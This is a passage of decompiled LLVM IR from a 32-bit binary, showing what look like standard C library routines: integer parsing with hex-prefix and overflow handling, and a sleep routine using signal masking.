  br i1 %v1_8053c05, label %dec_label_pc_8053c2b, label %dec_label_pc_8053c07

dec_label_pc_8053c07:                             ; preds = %dec_label_pc_8053bfd
  %v1_8053c07 = add i32 %arg3, 10
  store i32 %v1_8053c07, i32* %esi.global-to-local, align 4
  %v1_8053c0a = inttoptr i32 %v0_8053c0f to i8*
  %v2_8053c0a = load i8, i8* %v1_8053c0a, align 1
  %v8_8053c0a = icmp eq i8 %v2_8053c0a, 48
  %v1_8053c0d = icmp eq i1 %v8_8053c0a, false
  br i1 %v1_8053c0d, label %dec_label_pc_8053c21, label %dec_label_pc_8053c0f

dec_label_pc_8053c0f:                             ; preds = %dec_label_pc_8053c07
  %v1_8053c0f = add i32 %v0_8053c0f, 1
  store i32 %v1_8053c0f, i32* %ebx.global-to-local, align 4
  %v1_8053c10 = add i32 %arg3, 8
  store i32 %v1_8053c10, i32* %esi.global-to-local, align 4
  %v1_8053c15 = inttoptr i32 %v1_8053c0f to i8*
  %v2_8053c15 = load i8, i8* %v1_8053c15, align 1
  %v3_8053c15 = zext i8 %v2_8053c15 to i32
  %v5_8053c15 = and i32 %v4_8053c15, -256
  %v6_8053c15 = or i32 %v5_8053c15, %v3_8053c15
  %v1_8053c17 = or i32 %v6_8053c15, 32
  %v3_8053c17 = trunc i32 %v1_8053c17 to i8
  store i32 %v1_8053c17, i32* %eax.global-to-local, align 4
  %v10_8053c1a = icmp eq i8 %v3_8053c17, 120
  %v1_8053c1c = icmp eq i1 %v10_8053c1a, false
  br i1 %v1_8053c1c, label %dec_label_pc_8053c21, label %dec_label_pc_8053c1e

dec_label_pc_8053c1e:                             ; preds = %dec_label_pc_8053c0f
  %v2_8053c1e = mul i32 %v1_8053c10, 2
  store i32 %v2_8053c1e, i32* %esi.global-to-local, align 4
  %v1_8053c20 = add i32 %v0_8053c0f, 2
  store i32 %v1_8053c20, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c21

dec_label_pc_8053c21:                             ; preds = %dec_label_pc_8053c0f, %dec_label_pc_8053c07, %dec_label_pc_8053c1e
  %v0_8053c4a25 = phi i32 [ %v1_8053c0f, %dec_label_pc_8053c0f ], [ %v0_8053c0f, %dec_label_pc_8053c07 ], [ %v1_8053c20, %dec_label_pc_8053c1e ]
  %v0_8053ca133 = phi i32 [ %v1_8053c0f, %dec_label_pc_8053c0f ], [ %v4_8053bd1, %dec_label_pc_8053c07 ], [ %v1_8053c0f, %dec_label_pc_8053c1e ]
  %v0_8053c21 = phi i32 [ %v1_8053c10, %dec_label_pc_8053c0f ], [ %v1_8053c07, %dec_label_pc_8053c07 ], [ %v2_8053c1e, %dec_label_pc_8053c1e ]
  %v7_8053c24 = icmp sgt i32 %v0_8053c21, 16
  br i1 %v7_8053c24, label %dec_label_pc_8053c2b.thread, label %dec_label_pc_8053c2b

dec_label_pc_8053c2b.thread:                      ; preds = %dec_label_pc_8053c21
  store i32 16, i32* %esi.global-to-local, align 4
  store i32 14, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053c35

dec_label_pc_8053c2b:                             ; preds = %dec_label_pc_8053c21, %dec_label_pc_8053bfd
  %v0_8053ca134 = phi i32 [ %v0_8053ca133, %dec_label_pc_8053c21 ], [ %v4_8053bd1, %dec_label_pc_8053bfd ]
  %v0_8053c4a26 = phi i32 [ %v0_8053c4a25, %dec_label_pc_8053c21 ], [ %v0_8053c0f, %dec_label_pc_8053bfd ]
  %v0_8053c3a = phi i32 [ %v0_8053c21, %dec_label_pc_8053c21 ], [ %arg3, %dec_label_pc_8053bfd ]
  %v1_8053c2b = add i32 %v0_8053c3a, -2
  store i32 %v1_8053c2b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8053c33 = icmp ugt i32 %v1_8053c2b, 34
  br i1 %v6_8053c33, label %dec_label_pc_8053c96, label %dec_label_pc_8053c35

dec_label_pc_8053c35:                             ; preds = %dec_label_pc_8053c2b.thread, %dec_label_pc_8053c2b
  %v0_8053c3a58 = phi i32 [ 16, %dec_label_pc_8053c2b.thread ], [ %v0_8053c3a, %dec_label_pc_8053c2b ]
  %v0_8053c4a2657 = phi i32 [ %v0_8053c4a25, %dec_label_pc_8053c2b.thread ], [ %v0_8053c4a26, %dec_label_pc_8053c2b ]
  %v0_8053ca13456 = phi i32 [ %v0_8053ca133, %dec_label_pc_8053c2b.thread ], [ %v0_8053ca134, %dec_label_pc_8053c2b ]
  %div = udiv i32 -1, %v0_8053c3a58
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp51 = urem i32 -1, %v0_8053c3a58
  %v1_8053c3c = trunc i32 %tmp51 to i8
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_8053c76 = urem i32 %arg4, 256
  br label %dec_label_pc_8053c4a

dec_label_pc_8053c48:                             ; preds = %dec_label_pc_8053c8c, %dec_label_pc_8053c76
  %v4_8053c4a.pre = phi i32 [ %v1_8053c60, %dec_label_pc_8053c8c ], [ %v4_8053c4a.pre.pre, %dec_label_pc_8053c76 ]
  %v0_8053c48 = phi i32 [ %v1_8053c67, %dec_label_pc_8053c8c ], [ %v0_8053c48.pre, %dec_label_pc_8053c76 ]
  br label %dec_label_pc_8053c4a

dec_label_pc_8053c4a:                             ; preds = %dec_label_pc_8053c35, %dec_label_pc_8053c48
  %v0_8053ca132 = phi i32 [ %v0_8053ca13456, %dec_label_pc_8053c35 ], [ %v0_8053c48, %dec_label_pc_8053c48 ]
  %v0_8053c67 = phi i32 [ %v0_8053c4a2657, %dec_label_pc_8053c35 ], [ %v0_8053c48, %dec_label_pc_8053c48 ]
  %v4_8053c4a = phi i32 [ %div, %dec_label_pc_8053c35 ], [ %v4_8053c4a.pre, %dec_label_pc_8053c48 ]
  %v1_8053c4a = inttoptr i32 %v0_8053c67 to i8*
  %v2_8053c4a = load i8, i8* %v1_8053c4a, align 1
  %v3_8053c4a = zext i8 %v2_8053c4a to i32
  %v5_8053c4a = and i32 %v4_8053c4a, -256
  %v6_8053c4a = or i32 %v3_8053c4a, %v5_8053c4a
  store i32 %v6_8053c4a, i32* %eax.global-to-local, align 4
  %v1_8053c4c = add i32 %v6_8053c4a, -48
  %v1_8053c4f = trunc i32 %v1_8053c4c to i8
  %tmp59 = icmp ult i8 %v1_8053c4f, 10
  br i1 %tmp59, label %dec_label_pc_8053c60, label %dec_label_pc_8053c54

dec_label_pc_8053c54:                             ; preds = %dec_label_pc_8053c4a
  %v1_8053c54 = or i32 %v6_8053c4a, 32
  %v3_8053c54 = trunc i32 %v1_8053c54 to i8
  store i32 %v1_8053c54, i32* %eax.global-to-local, align 4
  %v1_8053c57 = and i32 %v1_8053c4c, -256
  %v2_8053c57 = or i32 %v1_8053c57, 40
  %tmp60 = icmp ult i8 %v3_8053c54, 97
  br i1 %tmp60, label %dec_label_pc_8053c60, label %dec_label_pc_8053c5d

dec_label_pc_8053c5d:                             ; preds = %dec_label_pc_8053c54
  %v1_8053c5d = add i32 %v1_8053c54, -87
  br label %dec_label_pc_8053c60

dec_label_pc_8053c60:                             ; preds = %dec_label_pc_8053c54, %dec_label_pc_8053c4a, %dec_label_pc_8053c5d
  %v0_8053c8f = phi i32 [ %v2_8053c57, %dec_label_pc_8053c54 ], [ %v1_8053c4c, %dec_label_pc_8053c4a ], [ %v1_8053c5d, %dec_label_pc_8053c5d ]
  %v1_8053c60 = urem i32 %v0_8053c8f, 256
  store i32 %v1_8053c60, i32* %eax.global-to-local, align 4
  %v1_8053c63 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053c63 = sub i32 %v1_8053c60, %v1_8053c63
  %v10_8053c63 = and i32 %v2_8053c63, %v1_8053c63
  %v11_8053c63 = icmp slt i32 %v10_8053c63, 0
  %v13_8053c63 = icmp slt i32 %v2_8053c63, 0
  %v2_8053c65 = icmp eq i1 %v13_8053c63, %v11_8053c63
  br i1 %v2_8053c65, label %dec_label_pc_8053c96, label %dec_label_pc_8053c67

dec_label_pc_8053c67:                             ; preds = %dec_label_pc_8053c60
  %v1_8053c67 = add i32 %v0_8053c67, 1
  store i32 %v1_8053c67, i32* %ebx.global-to-local, align 4
  %v0_8053c68 = load i32, i32* %edx.global-to-local, align 4
  %tmp61 = icmp ugt i32 %v0_8053c68, %div
  br i1 %tmp61, label %dec_label_pc_8053c76, label %dec_label_pc_8053c6e

dec_label_pc_8053c6e:                             ; preds = %dec_label_pc_8053c67
  %v15_8053c68 = icmp eq i32 %v0_8053c68, %div
  %v1_8053c6e = icmp eq i1 %v15_8053c68, false
  br i1 %v1_8053c6e, label %dec_label_pc_8053c8c, label %dec_label_pc_8053c70

dec_label_pc_8053c70:                             ; preds = %dec_label_pc_8053c6e
  %v1_8053c70 = trunc i32 %v0_8053c8f to i8
  %tmp62 = icmp ugt i8 %v1_8053c70, %v1_8053c3c
  br i1 %tmp62, label %dec_label_pc_8053c76, label %dec_label_pc_8053c8c

dec_label_pc_8053c76:                             ; preds = %dec_label_pc_8053c70, %dec_label_pc_8053c67
  store i32 %v4_8053c76, i32* %eax.global-to-local, align 4
  %v0_8053c7a = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053c7a = and i32 %v0_8053c7a, %v4_8053c76
  store i32 %v2_8053c7a, i32* %ebp.global-to-local, align 4
  %v1_8053c7c = call i32 @function_80526c9(i32 %div)
  store i32 %v1_8053c7c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8053c84 = inttoptr i32 %v1_8053c7c to i32*
  store i32 34, i32* %v1_8053c84, align 4
  %v0_8053c48.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8053c4a.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053c48

dec_label_pc_8053c8c:                             ; preds = %dec_label_pc_8053c70, %dec_label_pc_8053c6e
  %v4_8053c8c = mul i32 %v0_8053c68, %v1_8053c63
  store i32 %v1_8053c60, i32* %eax.global-to-local, align 4
  %v2_8053c92 = add i32 %v4_8053c8c, %v1_8053c60
  store i32 %v2_8053c92, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053c48

dec_label_pc_8053c96:                             ; preds = %dec_label_pc_8053c60, %dec_label_pc_8053c2b
  %v0_8053ca1 = phi i32 [ %v0_8053ca134, %dec_label_pc_8053c2b ], [ %v0_8053ca132, %dec_label_pc_8053c60 ]
  %stack_var_-24.0 = phi i32 [ %tmp41, %dec_label_pc_8053c2b ], [ %div, %dec_label_pc_8053c60 ]
  %v4_8053c96 = icmp eq i32 %arg2, 0
  br i1 %v4_8053c96, label %dec_label_pc_8053ca3, label %dec_label_pc_8053c9d

dec_label_pc_8053c9d:                             ; preds = %dec_label_pc_8053c96
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8053ca1 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8053ca1, i32* %v2_8053ca1, align 4
  br label %dec_label_pc_8053ca3

dec_label_pc_8053ca3:                             ; preds = %dec_label_pc_8053c96, %dec_label_pc_8053c9d
  %v0_8053ca3 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_8053ca3, i32* %eax.global-to-local, align 4
  %v1_8053ca5 = trunc i32 %v0_8053ca3 to i8
  %v6_8053ca5 = icmp eq i8 %v1_8053ca5, 0
  %v2_8053ca7 = zext i1 %v6_8053ca5 to i32
  %v1_8053ca93 = or i32 %v2_8053ca7, -2147483648
  store i32 %v1_8053ca93, i32* %ebx.global-to-local, align 4
  %v5_8053caf = icmp eq i8 %tmp, 0
  br i1 %v5_8053caf, label %dec_label_pc_8053cc7, label %dec_label_pc_8053cb6

dec_label_pc_8053cb6:                             ; preds = %dec_label_pc_8053ca3
  %v0_8053cb6 = load i32, i32* %edx.global-to-local, align 4
  %tmp63 = icmp ugt i32 %v0_8053cb6, %v1_8053ca93
  br i1 %tmp63, label %dec_label_pc_8053cba, label %dec_label_pc_8053cc7

dec_label_pc_8053cba:                             ; preds = %dec_label_pc_8053cb6
  %v1_8053cba = call i32 @function_80526c9(i32 %stack_var_-24.0)
  store i32 %v1_8053cba, i32* %eax.global-to-local, align 4
  %v0_8053cbf = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053cbf, i32* %edx.global-to-local, align 4
  %v1_8053cc1 = inttoptr i32 %v1_8053cba to i32*
  store i32 34, i32* %v1_8053cc1, align 4
  %v0_8053cc7.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8053cc7

dec_label_pc_8053cc7:                             ; preds = %dec_label_pc_8053cb6, %dec_label_pc_8053ca3, %dec_label_pc_8053cba
  %v0_8053cc7 = phi i32 [ %v0_8053ca3, %dec_label_pc_8053cb6 ], [ %v0_8053ca3, %dec_label_pc_8053ca3 ], [ %v0_8053cc7.pre, %dec_label_pc_8053cba ]
  store i32 %v0_8053cc7, i32* %eax.global-to-local, align 4
  %v3_8053cc9 = trunc i32 %v0_8053cc7 to i8
  %v4_8053cc9 = icmp eq i8 %v3_8053cc9, 0
  %v0_8053cd2.pre = load i32, i32* %edx.global-to-local, align 4
  br i1 %v4_8053cc9, label %dec_label_pc_8053ccf, label %dec_label_pc_8053ccd

dec_label_pc_8053ccd:                             ; preds = %dec_label_pc_8053cc7
  %v1_8053ccd = sub i32 0, %v0_8053cd2.pre
  store i32 %v1_8053ccd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053ccf

dec_label_pc_8053ccf:                             ; preds = %dec_label_pc_8053cc7, %dec_label_pc_8053ccd
  %v0_8053cd2 = phi i32 [ %v1_8053ccd, %dec_label_pc_8053ccd ], [ %v0_8053cd2.pre, %dec_label_pc_8053cc7 ]
  store i32 %v0_8053cd2, i32* %eax.global-to-local, align 4
  %v2_8053cd4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053cd4, i32* @ebx, align 4
  ret i32 %v0_8053cd2

; uselistorder directives
  uselistorder i32 %v0_8053cd2, { 1, 0 }
  uselistorder i32 %v0_8053cc7, { 1, 0 }
  uselistorder i32 %v0_8053c68, { 0, 2, 1 }
  uselistorder i32 %v1_8053c67, { 1, 0 }
  uselistorder i32 %v2_8053c63, { 1, 0 }
  uselistorder i32 %v1_8053c60, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8053c8f, { 1, 0 }
  uselistorder i32 %v0_8053c48, { 1, 0 }
  uselistorder i32 %v4_8053c76, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_8053c3a58, { 1, 0 }
  uselistorder i32 %v0_8053ca134, { 1, 0 }
  uselistorder i32 %v2_8053c1e, { 1, 0 }
  uselistorder i32 %v1_8053c17, { 1, 0 }
  uselistorder i32 %v1_8053c10, { 1, 0, 2 }
  uselistorder i32 %v0_8053c0f, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_8053c15, { 2, 0, 1 }
  uselistorder i32 %v1_8053bdd, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8053bd1, { 3, 2, 1, 0, 4 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 6, 1, 7, 2, 3, 4, 5, 8, 10, 9 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 16, 14, 15, 17 }
  uselistorder i8 10, { 0, 1, 2, 3, 6, 5, 4, 7, 12, 9, 10, 13, 11, 8 }
  uselistorder i8 48, { 0, 2, 1 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 32, { 17, 16, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 9, 13, 14, 15, 0, 10 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053ccf, { 1, 0 }
  uselistorder label %dec_label_pc_8053cc7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053ca3, { 1, 0 }
  uselistorder label %dec_label_pc_8053c60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053c4a, { 1, 0 }
  uselistorder label %dec_label_pc_8053c35, { 1, 0 }
  uselistorder label %dec_label_pc_8053c21, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053bfd, { 1, 0 }
  uselistorder label %dec_label_pc_8053bfc, { 1, 0 }
  uselistorder label %dec_label_pc_8053bdd, { 1, 0 }
}

define i32 @function_8053cd9(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053cd9:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8053cec = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053cec, i32* @ebx, align 4
  %v2_8053cf1 = call i32 @function_8054050(i32 %v2_8053cec, i32 134561869)
  %v1_8053cfd = call i32 @function_805404d(i32 ptrtoint (i32* @global_var_8056810.230 to i32))
  %v0_8053d02 = load i32, i32* @global_var_80568f8.231, align 8
  store i32 %v0_8053d02, i32* @eax, align 4
  %v1_8053d0a = icmp eq i32 %v0_8053d02, 0
  br i1 %v1_8053d0a, label %dec_label_pc_8053d17, label %dec_label_pc_8053d0e

dec_label_pc_8053d0e:                             ; preds = %dec_label_pc_8053cd9
  %v0_8053d11 = load i32, i32* @esi, align 4
  %v1_8053d12 = call i32 @unknown_0(i32 %v0_8053d11)
  store i32 %v1_8053d12, i32* @eax, align 4
  br label %dec_label_pc_8053d17

dec_label_pc_8053d17:                             ; preds = %dec_label_pc_8053cd9, %dec_label_pc_8053d0e
  %v2_8053d1c = call i32 @function_8054050(i32 %v2_8053cec, i32 1)
  %v0_8053d21 = call i32 @function_805400e()
  %v0_8053d3a = load i32, i32* @esi, align 4
  %v1_8053d3b = call i32 @function_80543f0(i32 %v0_8053d3a)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_80543f0, { 1, 0 }
  uselistorder i32 (i32)* @function_805404d, { 7, 6, 5, 4, 3, 10, 0, 1, 9, 8, 2 }
  uselistorder i32 (i32, i32)* @function_8054050, { 9, 8, 7, 6, 13, 12, 5, 0, 4, 1, 11, 10, 3, 2 }
  uselistorder label %dec_label_pc_8053d17, { 1, 0 }
}

define i32 @function_8053d40(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053d40:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8053d40 = load i32, i32* @ebp, align 4
  %v0_8053d41 = load i32, i32* @edi, align 4
  %v0_8053d42 = load i32, i32* @esi, align 4
  %v0_8053d43 = load i32, i32* @ebx, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_8053d56 = icmp eq i32 %arg1, 0
  %v1_8053d58 = icmp eq i1 %v1_8053d56, false
  br i1 %v1_8053d58, label %dec_label_pc_8053d5f.lr.ph, label %dec_label_pc_8053eb7

dec_label_pc_8053d5f.lr.ph:                       ; preds = %dec_label_pc_8053d40
  %v15_8053d44 = ptrtoint i32* %stack_var_-444 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8053d5f56 = add i32 %v15_8053d44, 416
  %v5_8053d5f57 = inttoptr i32 %v4_8053d5f56 to i32*
  store i32 0, i32* %v5_8053d5f57, align 4
  %v0_8053d6a58 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053d6a59 = add i32 %v0_8053d6a58, -1
  %v9_8053d6a60 = icmp slt i32 %v1_8053d6a59, 0
  store i32 %v1_8053d6a59, i32* %eax.global-to-local, align 4
  %v1_8053d6b61 = icmp eq i1 %v9_8053d6a60, false
  br i1 %v1_8053d6b61, label %dec_label_pc_8053d5f.dec_label_pc_8053d5f_crit_edge, label %dec_label_pc_8053d6d

dec_label_pc_8053d5f.dec_label_pc_8053d5f_crit_edge: ; preds = %dec_label_pc_8053d5f.lr.ph, %dec_label_pc_8053d5f.dec_label_pc_8053d5f_crit_edge
  %v1_8053d6a62 = phi i32 [ %v1_8053d6a, %dec_label_pc_8053d5f.dec_label_pc_8053d5f_crit_edge ], [ %v1_8053d6a59, %dec_label_pc_8053d5f.lr.ph ]
  %v0_8053d5f.pre = load i32, i32* @esp, align 4
  %v2_8053d5f = mul i32 %v1_8053d6a62, 4
  %v3_8053d5f = add i32 %v0_8053d5f.pre, 292
  %v4_8053d5f = add i32 %v3_8053d5f, %v2_8053d5f
  %v5_8053d5f = inttoptr i32 %v4_8053d5f to i32*
  store i32 0, i32* %v5_8053d5f, align 4
  %v0_8053d6a = load i32, i32* %eax.global-to-local, align 4
  %v1_8053d6a = add i32 %v0_8053d6a, -1
  %v9_8053d6a = icmp slt i32 %v1_8053d6a, 0
  store i32 %v1_8053d6a, i32* %eax.global-to-local, align 4
  %v1_8053d6b = icmp eq i1 %v9_8053d6a, false
  br i1 %v1_8053d6b, label %dec_label_pc_8053d5f.dec_label_pc_8053d5f_crit_edge, label %dec_label_pc_8053d6d

dec_label_pc_8053d6d:                             ; preds = %dec_label_pc_8053d5f.dec_label_pc_8053d5f_crit_edge, %dec_label_pc_8053d5f.lr.ph
  %v1_8053d6a.lcssa = phi i32 [ %v1_8053d6a59, %dec_label_pc_8053d5f.lr.ph ], [ %v1_8053d6a, %dec_label_pc_8053d5f.dec_label_pc_8053d5f_crit_edge ]
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8053d83 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8053d83, i32* @ebx, align 4
  store i32 %v2_8053d83, i32* %stack_var_-460, align 4
  %v4_8053d8b = call i32 @function_8052ade(i32 %v2_8053d83, i32 17, i32 %v1_8053d6a.lcssa, i32 %v1_8053d6a.lcssa)
  store i32 %v4_8053d8b, i32* %eax.global-to-local, align 4
  %v2_8053d93 = icmp slt i32 %v4_8053d8b, 0
  br i1 %v2_8053d93, label %dec_label_pc_8053ebb, label %dec_label_pc_8053d9b

dec_label_pc_8053d9b:                             ; preds = %dec_label_pc_8053d6d
  %v2_8053d9c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8053d9c, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8053da7 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8053da7 = call i32 @function_80523fd(i32 0, %_TYPEDEF_sigset_t* %v3_8053da7, i32 %v2_8053d9c)
  store i32 %v4_8053da7, i32* %eax.global-to-local, align 4
  %v1_8053daf = icmp eq i32 %v4_8053da7, 0
  %v1_8053db1 = icmp eq i1 %v1_8053daf, false
  br i1 %v1_8053db1, label %dec_label_pc_8053ebb, label %dec_label_pc_8053db7

dec_label_pc_8053db7:                             ; preds = %dec_label_pc_8053d9b
  store i32 %v2_8053d9c, i32* %stack_var_-460, align 4
  %v4_8053dbc = call i32 @function_8052aba(i32 %v2_8053d9c, i32 17, i32 %v4_8053da7, i32 %v4_8053da7)
  store i32 %v4_8053dbc, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8053dc9 = icmp eq i32 %v4_8053dbc, 0
  br i1 %v1_8053dc9, label %dec_label_pc_8053dd2.lr.ph, label %dec_label_pc_8053e85

dec_label_pc_8053dd2.lr.ph:                       ; preds = %dec_label_pc_8053db7
  store i32 31, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v5_8053d5f57, align 4
  %v0_8053ddd50 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053ddd51 = add i32 %v0_8053ddd50, -1
  %v9_8053ddd52 = icmp slt i32 %v1_8053ddd51, 0
  store i32 %v1_8053ddd51, i32* %edx.global-to-local, align 4
  %v1_8053dde53 = icmp eq i1 %v9_8053ddd52, false
  br i1 %v1_8053dde53, label %dec_label_pc_8053dd2.dec_label_pc_8053dd2_crit_edge, label %dec_label_pc_8053de0

dec_label_pc_8053dd2.dec_label_pc_8053dd2_crit_edge: ; preds = %dec_label_pc_8053dd2.lr.ph, %dec_label_pc_8053dd2.dec_label_pc_8053dd2_crit_edge
  %v1_8053ddd54 = phi i32 [ %v1_8053ddd, %dec_label_pc_8053dd2.dec_label_pc_8053dd2_crit_edge ], [ %v1_8053ddd51, %dec_label_pc_8053dd2.lr.ph ]
  %v0_8053dd2.pre = load i32, i32* @esp, align 4
  %v2_8053dd2 = mul i32 %v1_8053ddd54, 4
  %v3_8053dd2 = add i32 %v0_8053dd2.pre, 292
  %v4_8053dd2 = add i32 %v3_8053dd2, %v2_8053dd2
  %v5_8053dd2 = inttoptr i32 %v4_8053dd2 to i32*
  store i32 0, i32* %v5_8053dd2, align 4
  %v0_8053ddd = load i32, i32* %edx.global-to-local, align 4
  %v1_8053ddd = add i32 %v0_8053ddd, -1
  %v9_8053ddd = icmp slt i32 %v1_8053ddd, 0
  store i32 %v1_8053ddd, i32* %edx.global-to-local, align 4
  %v1_8053dde = icmp eq i1 %v9_8053ddd, false
  br i1 %v1_8053dde, label %dec_label_pc_8053dd2.dec_label_pc_8053dd2_crit_edge, label %dec_label_pc_8053de0

dec_label_pc_8053de0:                             ; preds = %dec_label_pc_8053dd2.dec_label_pc_8053dd2_crit_edge, %dec_label_pc_8053dd2.lr.ph
  store i32 %v2_8053d83, i32* %eax.global-to-local, align 4
  store i32 %v2_8053d83, i32* %stack_var_-460, align 4
  %v4_8053dec = call i32 @function_8052ade(i32 %v2_8053d83, i32 17, i32 0, i32 0)
  store i32 %v4_8053dec, i32* %eax.global-to-local, align 4
  %v2_8053df4 = icmp slt i32 %v4_8053dec, 0
  br i1 %v2_8053df4, label %dec_label_pc_8053ebb, label %dec_label_pc_8053dfc

dec_label_pc_8053dfc:                             ; preds = %dec_label_pc_8053de0
  %v2_8053dfd = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8053dfd, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8053e06 = call i32 @function_805428f(i32 17, i32* null, i32 %v2_8053dfd)
  store i32 %v4_8053e06, i32* %eax.global-to-local, align 4
  %v2_8053e0e = icmp slt i32 %v4_8053e06, 0
  %v1_8053e10 = icmp eq i1 %v2_8053e0e, false
  br i1 %v1_8053e10, label %dec_label_pc_8053e3a, label %dec_label_pc_8053e12

dec_label_pc_8053e12:                             ; preds = %dec_label_pc_8053dfc
  %v0_8053e12 = load i32, i32* %stack_var_-460, align 4
  %v1_8053e12 = call i32 @function_80526c9(i32 %v0_8053e12)
  store i32 %v1_8053e12, i32* %eax.global-to-local, align 4
  store i32 %v1_8053e12, i32* @ebx, align 4
  %v1_8053e19 = inttoptr i32 %v1_8053e12 to i32*
  %v2_8053e19 = load i32, i32* %v1_8053e19, align 4
  store i32 %v2_8053e19, i32* @esi, align 4
  store i32 %v2_8053d9c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053e28 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053e28 = call i32 @function_80523fd(i32 2, %_TYPEDEF_sigset_t* %v3_8053e28, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8053e33 = load i32, i32* @esi, align 4
  %v1_8053e33 = load i32, i32* @ebx, align 4
  %v2_8053e33 = inttoptr i32 %v1_8053e33 to i32*
  store i32 %v0_8053e33, i32* %v2_8053e33, align 4
  %v0_8053ec8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ebe

dec_label_pc_8053e3a:                             ; preds = %dec_label_pc_8053dfc
  %v3_8053e3a = load i32, i32* %stack_var_-420, align 4
  %v12_8053e3a = icmp eq i32 %v3_8053e3a, 1
  %v2_8053e46 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053e46, i32* @ebx, align 4
  %v1_8053e4d = icmp eq i1 %v12_8053e3a, false
  br i1 %v1_8053e4d, label %dec_label_pc_8053e74, label %dec_label_pc_8053e4f

dec_label_pc_8053e4f:                             ; preds = %dec_label_pc_8053e3a
  %v0_8053e4f = load i32, i32* @edi, align 4
  store i32 %v2_8053e46, i32* %stack_var_-460, align 4
  %v4_8053e53 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8053e53 = call i32 @function_80547e7(%timespec* %v4_8053e53, i32 %v2_8053e46, i32 %v0_8053e4f, i32 %v0_8053e4f)
  store i32 %v5_8053e53, i32* %eax.global-to-local, align 4
  store i32 %v5_8053e53, i32* @edi, align 4
  %v1_8053e5a = call i32 @function_80526c9(i32 %v2_8053e46)
  store i32 %v1_8053e5a, i32* %eax.global-to-local, align 4
  store i32 %v1_8053e5a, i32* @ebx, align 4
  %v1_8053e64 = inttoptr i32 %v1_8053e5a to i32*
  %v2_8053e64 = load i32, i32* %v1_8053e64, align 4
  store i32 %v2_8053e64, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053e6b = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053e6b = call i32 @function_80523fd(i32 2, %_TYPEDEF_sigset_t* %v3_8053e6b, i32 0)
  store i32 %v4_8053e6b, i32* %eax.global-to-local, align 4
  %v0_8053e70 = load i32, i32* @esi, align 4
  %v1_8053e70 = load i32, i32* @ebx, align 4
  %v2_8053e70 = inttoptr i32 %v1_8053e70 to i32*
  store i32 %v0_8053e70, i32* %v2_8053e70, align 4
  %v0_8053e9a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053e97

